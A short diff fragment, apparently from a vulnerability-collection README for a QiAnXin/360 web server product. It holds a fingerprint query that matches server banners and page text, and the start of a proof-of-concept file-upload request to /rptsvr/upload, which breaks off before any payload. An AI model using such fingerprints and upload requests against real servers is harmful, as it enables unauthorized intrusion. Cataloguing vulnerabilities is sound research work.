@@ -7,7 +7,7 @@
 banner="QiAnXin web server" || banner="360 web server"  || body="appid\":\"skylar6" || body="/task/index/detail?id={item.id}" || body="已过期或者未授权，购买请联系4008-136-360"
 ```
 
-## poc
+## POC
 ```
 POST /rptsvr/upload HTTP/1.1
 Host: 
